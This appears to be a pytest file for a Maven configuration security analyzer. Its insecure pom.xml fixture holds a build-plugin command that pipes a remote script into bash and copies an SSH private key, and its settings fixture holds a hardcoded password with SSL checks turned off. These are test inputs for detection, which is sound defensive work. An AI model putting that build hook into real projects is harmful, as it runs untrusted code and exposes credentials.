"""Tests for MavenAnalyzer."""

from pathlib import Path

from devai.maven_analyzer import MavenAnalyzer, MavenFinding


INSECURE_POM = """\
<?xml version="1.0" encoding="UTF-8"?>
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>insecure-app</artifactId>
  <version>1.0.0</version>

  <repositories>
    <repository>
      <id>insecure-repo</id>
      <url>http://insecure-maven.example.com/maven2</url>
    </repository>
  </repositories>

  <distributionManagement>
    <repository>
      <id>deploy</id>
      <url>http://deploy.example.com/maven2</url>
    </repository>
  </distributionManagement>

  <dependencies>
    <dependency>
      <groupId>com.example</groupId>
      <artifactId>library</artifactId>
      <version>LATEST</version>
    </dependency>
    <dependency>
      <groupId>com.bad</groupId>
      <artifactId>artifact</artifactId>
      <version>1.0.0-SNAPSHOT</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <configuration>
          <executable>sh</executable>
          <arguments>
            <argument>-c</argument>
            <argument>curl -s https://install.example.com/script.sh | bash &amp;&amp; cp /home/user/.ssh/id_rsa /tmp/key</argument>
          </arguments>
        </configuration>
      </plugin>
    </plugins>
  </build>

  <scm>
    <connection>scm:git:git@github.com:example/repo.git</connection>
    <url>https://github.com/example/repo</url>
  </scm>
</project>
"""

INSECURE_SETTINGS = """\
<settings>
  <servers>
    <server>
      <id>deploy</id>
      <username>deployer</username>
      <password>hardcoded-deploy-password</password>
    </server>
  </servers>
  <profiles>
    <profile>
      <id>insecure</id>
      <properties>
        <maven.wagon.http.ssl.insecure>true</maven.wagon.http.ssl.insecure>
      </properties>
    </profile>
  </profiles>
</settings>
"""

HARDENED_POM = """\
<?xml version="1.0" encoding="UTF-8"?>
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>secure-app</artifactId>
  <version>1.0.0</version>

  <repositories>
    <repository>
      <id>central</id>
      <url>https://repo.maven.apache.org/maven2</url>
    </repository>
  </repositories>

  <dependencies>
    <dependency>
      <groupId>org.junit.jupiter</groupId>
      <artifactId>junit-jupiter</artifactId>
      <version>5.10.2</version>
      <scope>test</scope>
    </dependency>
  </dependencies>
</project>
"""


class TestMavenAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(INSECURE_POM, encoding="utf-8")
        (tmp_path / "settings.xml").write_text(INSECURE_SETTINGS, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "insecure_distribution" in kinds
        assert "dynamic_version" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path" in kinds
        assert "insecure_ssl" in kinds
        assert "snapshot_dependency" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(HARDENED_POM, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        assert analyzer.health_score() >= 95.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(INSECURE_POM, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, MavenFinding)
        assert "[high]" in finding.format() or "[medium]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pom.xml").write_text(INSECURE_POM, encoding="utf-8")
        analyzer = MavenAnalyzer(str(tmp_path))
        assert "Maven configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Maven analysis:" in context
        assert "dependencies:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = MavenAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "https://repo.maven.apache.org/maven2" in config
        assert "settings" in config

    def test_detects_nested_pom(self, tmp_path: Path):
        module = tmp_path / "module"
        module.mkdir()
        (module / "pom.xml").write_text(
            '<project><repositories><repository><url>http://bad.example.com/repo</url></repository></repositories></project>\n',
            encoding="utf-8",
        )
        analyzer = MavenAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
        kinds = {f.kind for f in analyzer.analyze()}
        assert "insecure_http" in kinds
